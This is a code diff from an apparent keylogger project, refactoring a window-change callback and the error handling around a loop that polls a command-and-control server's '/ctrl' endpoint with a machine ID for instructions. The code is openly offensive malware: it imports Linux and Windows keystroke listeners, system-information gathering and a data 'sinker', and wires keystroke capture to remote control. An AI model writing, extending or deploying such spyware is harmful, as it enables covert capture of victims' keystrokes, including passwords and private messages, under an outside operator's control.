@@ -11,7 +11,7 @@ from keylogger.sinker import Sinker
 from keylogger.processor import Processor
 from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
 from keylogger.system_info import get_system_info
-from keylogger.active_window import WindowTracker
+from keylogger.active_window import WindowInfo, WindowTracker
 
 logger = logging.getLogger(__name__)
 
@@ -74,9 +74,11 @@ class DefaultManager:
             klogger: Listener = LinuxKeylogger()
             # Start a new sequence when the active window changes
             try:
+                def _callback(w: WindowInfo):
+                    klogger.start_new_sequence(w.title or w.process_name)
+
                 self.window_tracker = WindowTracker(
-                    # use lambda to call the start_new_sequence method with the window title
-                    lambda w: klogger.start_new_sequence(w.title or w.process_name)
+                    callback=_callback
                 )
             except Exception:
                 logger.error("Failed to create the WindowTracker", exc_info=False)
@@ -200,34 +202,38 @@ class DefaultManager:
             return "start"
 
         try:
-            resp = requests.get(
-                f"{self.endpoint}/ctrl",
-                params={"last": last, "machine_id": self.machine_id},
-            )
-        except requests.exceptions.ConnectionError as e:
-            logger.error(f"Failed to connect to the C2C server: {self.endpoint}", e)
+            try:
+                resp = requests.get(
+                    f"{self.endpoint}/ctrl",
+                    params={"last": last, "machine_id": self.machine_id},
+                )
+            except requests.exceptions.ConnectionError as e:
+                logger.error(f"Failed to connect to the C2C server: {self.endpoint}", e)
+                return
+            except requests.exceptions.RequestException as e:
+                logger.error(
+                    f"Failed to get the control command from the C2C server: {self.endpoint}",
+                    e,
+                )
+                return
+            except KeyboardInterrupt:
+                return "exit"
+            except Exception as e:
+                logger.error(
+                    f"Failed to get the control command from the C2C server: {self.endpoint}",
+                    # str(e)
+                )
+                return
+            
+            if resp.status_code != 200:
+                logger.error(
+                    f"Failed to get the control command from the C2C server: {self.endpoint}",
+                    resp.json(),
+                )
+                return "exit"
+        except Exception:
             return
-        except requests.exceptions.RequestException as e:
-            logger.error(
-                f"Failed to get the control command from the C2C server: {self.endpoint}",
-                e,
-            )
-            return
-        except KeyboardInterrupt:
-            return "exit"
-        except Exception as e:
-            logger.error(
-                f"Failed to get the control command from the C2C server: {self.endpoint}",
-                e,
-            )
-            return
-
-        if resp.status_code != 200:
-            logger.error(
-                f"Failed to get the control command from the C2C server: {self.endpoint}",
-                resp.json(),
-            )
-            return "exit"
+        
 
         logger.debug(f"Received control command: {resp.json().get('ctrl', '')}")
 
